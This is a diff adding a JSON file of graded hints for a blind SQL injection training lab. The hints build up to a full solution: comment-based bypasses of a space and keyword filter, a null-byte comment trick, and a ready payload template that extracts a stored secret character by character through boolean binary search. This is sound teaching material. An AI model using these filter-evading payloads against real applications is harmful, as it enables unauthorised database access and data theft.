@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-20-blind-filter",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "Spaces and common keywords are blocked, but there are always alternative ways to write SQL. MySQL has many syntax quirks that can help."
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "Replace spaces with /**/ (inline comments). The filter blocks exact keyword matches, so UN/**/ION and SEL/**/ECT bypass it. But since this is blind, you don't need UNION — focus on boolean conditions."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "For spaces use /**/. For comments use ;%00 (null byte) or build conditions without needing comment termination. Test: ABC'/**/||/**/'1'='1 — if 'valid', the OR condition works. Then use ASCII(SUBSTR(...)) for extraction."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "Payload template (URL-encoded): code=ABC'/**/||/**/ASCII(SUBSTR((SEL/**/ECT/**/secret/**/FR/**/OM/**/promo_secrets/**/LIMIT/**/1),{pos},1))>{mid}/**/||/**/'1'='2  This creates: WHERE code='ABC' || ASCII(SUBSTR((SELECT...),pos,1))>mid || '1'='2'. True if char > mid."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "Script approach: For each position N (1 to flag_length), binary search ASCII value (32-126). Request: /validate?code=ABC'/**/||/**/ASCII(SUBSTR((SEL/**/ECT/**/secret/**/FR/**/OM/**/promo_secrets/**/LIMIT/**/1),{N},1))>{mid}/**/||/**/'1'='2  If response contains 'valid' -> char ASCII > mid (search upper half). If 'invalid' -> char ASCII <= mid (search lower half). /**/ replaces all spaces. SEL/**/ECT and FR/**/OM bypass the keyword filter. First find length: ASCII(SUBSTR(...)=0 means past end of string."
+    }
+  ]
+}
